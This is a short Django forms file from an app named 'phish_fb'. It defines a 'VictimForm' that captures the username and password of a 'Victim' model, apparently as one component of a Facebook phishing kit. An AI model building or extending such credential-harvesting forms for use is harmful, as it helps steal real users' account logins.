from django import forms 
from django.forms import ModelForm, fields
from phish_fb.models import Victim

class VictimForm(ModelForm):

    
    class Meta:
        model = Victim
        fields=['username','password']